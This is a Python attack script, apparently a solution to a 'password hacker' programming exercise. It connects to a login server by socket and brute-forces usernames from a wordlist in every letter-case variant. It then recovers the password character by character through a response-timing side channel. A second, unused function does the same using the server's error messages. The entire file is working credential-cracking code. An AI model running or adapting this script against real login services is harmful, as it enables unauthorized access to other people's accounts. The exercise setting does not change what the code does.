import argparse
import json
import socket
import time
from itertools import product

parser = argparse.ArgumentParser()
parser.add_argument("address")
parser.add_argument("port")
alphabet = [chr(ord("a") + x) for x in range(26)] + [str(x) for x in range(10)]


def login_msg(user, password):
    return json.dumps({
        "login": user,
        "password": password
    })


def read_login_msg(msg):
    return json.loads(msg)['result']


def password_iterator_generator(n: int) -> product:
    return product(*[alphabet for _ in range(n)])


def dict_password_iterator_generator(password: str) -> product:
    return product(*[(x, x.upper()) if x.isalpha() else x for x in password])


def dict_user_iterator_generator(password: str) -> product:
    return product(*[(x, x.upper()) if x.isalpha() else x for x in password])


def find_password(address, port, user):
    with socket.socket() as client:
        client.connect((address, port))
        buffle_size = 1024
        password = ""
        while True:
            find = False
            # print(password)
            for x in alphabet:
                if find:
                    break
                for y in (x, x.upper()) if x.isalpha() else [x, ]:
                    print(y)
                    client.send(login_msg(user, password + y).encode())
                    response = client.recv(buffle_size)
                    result = response.decode()
                    if read_login_msg(result) == "Exception happened during login":
                        password = password + y
                        find = True
                    if read_login_msg(result) == "Connection success!":
                        password = password + y
                        return password


def find_user(address, port):
    with socket.socket() as client:
        client.connect((address, port))
        buffle_size = 1024
        with open("logins.txt") as f:
            for x in f.readlines():
                for y in dict_user_iterator_generator(x.strip()):
                    client.send(login_msg("".join(y), "").encode())
                    response = client.recv(buffle_size)
                    result = response.decode()
                    if read_login_msg(result) == "Wrong password!":
                        user = "".join(y)
                        password = ""
                        while True:
                            find = False
                            # print(password)
                            for x in alphabet:
                                if find:
                                    break
                                for y in (x, x.upper()) if x.isalpha() else [x, ]:
                                    start = time.time()
                                    client.send(login_msg(user, password + y).encode())
                                    response = client.recv(buffle_size)
                                    end = time.time()
                                    result = response.decode()
                                    if end - start > 0.1:
                                        password = password + y
                                        find = True
                                    if read_login_msg(result) == "Connection success!":
                                        password = password + y
                                        return login_msg(user, password)


if __name__ == "__main__":
    args = parser.parse_args()
    (address, port) = args.address, int(args.port)
    user = find_user(address, port)
    print(user)
